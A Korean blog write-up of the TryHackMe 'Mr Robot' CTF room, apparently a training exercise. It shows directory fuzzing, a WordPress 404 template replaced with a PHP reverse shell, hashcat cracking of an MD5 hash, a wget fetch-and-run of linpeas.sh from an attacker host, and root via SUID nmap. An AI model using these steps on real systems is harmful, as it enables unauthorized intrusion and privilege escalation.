---
title: "MrRobotCTF"
categories: 
  - tryhackme
  - pentesting
tags:
  - pentesting
toc: true
---
# nmap

![img](/assets/images/thm/mrrobotctf/mrrobot_nmap.png)

# ffuf

> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.145.4/FUZZ > ffuf.txt

![img](/assets/images/thm/mrrobotctf/mrrobot_ffuf.png)

# /license 접속

- 사이트 맨 아래쪽 확인

![img](/assets/images/thm/mrrobotctf/mrrobot_license.png)

## base 64 decode

![img](/assets/images/thm/mrrobotctf/mrrobot_base64decode.png)

# /robots 접속

![img](/assets/images/thm/mrrobotctf/mrrobot_robots.png)

- hxxp://IP/key-1-of-3.txt 접속하여 플래그 확인

![img](/assets/images/thm/mrrobotctf/mrrobot_key1.png)

# /wp-login 접속

- base64 decode한 접속정보로 접속

![img](/assets/images/thm/mrrobotctf/mrrobot_wplogin.png)

- theme로 간 후 404.php를 php reverse shell.php로 변경

![img](/assets/images/thm/mrrobotctf/mrrobot_404template.png)

# shell 획득

- uid가 1인 daemon 계정 확인됨

![img](/assets/images/thm/mrrobotctf/mrrobot_nc.png)

![img](/assets/images/thm/mrrobotctf/mrrobot_ls.png)

- ls로 확인된 md5 해시에 hashcat 사용

> hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# robot으로 사용자 변경

> su robot

![img](/assets/images/thm/mrrobotctf/mrrobot_key2.png)

# linpeas.sh

```sh
wget hxxp://IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![img](/assets/images/thm/mrrobotctf/mrrobot_linpeas.png)

- suid가 설정된 nmap 확인

# 권한 상승

- gtfobins에 nmap 검색

![img](/assets/images/thm/mrrobotctf/mrrobot_nmapsh.png)

![img](/assets/images/thm/mrrobotctf/mrrobot_key3.png)